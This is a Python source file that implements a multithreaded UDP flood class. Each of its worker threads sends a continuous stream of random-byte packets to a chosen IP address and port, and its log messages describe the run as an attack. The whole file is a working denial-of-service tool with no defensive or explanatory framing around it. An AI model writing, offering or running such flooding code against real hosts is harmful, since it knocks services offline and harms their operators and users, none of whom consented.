import logging
import random
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import init, Fore

init(autoreset=True)

class UdpFlood:
    def __init__(self, target_ip, target_port, packet_size=1024, num_threads=10):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_size = packet_size
        self.is_running = True
        self.num_threads = num_threads

    def create_udp_packet(self):
        return random._urandom(self.packet_size)

    def send_udp_packet(self):
        while self.is_running:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet = self.create_udp_packet()
            try:
                sock.sendto(packet, (self.target_ip, self.target_port))
                logging.debug(Fore.GREEN + f"Sent UDP packet to {self.target_ip}:{self.target_port}")
                time.sleep(random.uniform(0.01, 0.1))  # Optional delay to control the rate of sending

            except socket.error as e:
                logging.error(Fore.RED + f"Socket error: {e}")
            except Exception as e:
                logging.error(Fore.RED + f"Unexpected error: {e}")
            finally:
                sock.close()

    def attack(self):
        logging.info(f"Starting UDP Flood attack to {self.target_ip}:{self.target_port}")

        with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
            futures = [executor.submit(self.send_udp_packet) for _ in range(self.num_threads)]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.error(Fore.RED + f"Error in thread: {e}")

        logging.info(f"UDP Flood attack to {self.target_ip}:{self.target_port} finished")

    def stop_attack(self):
        self.is_running = False

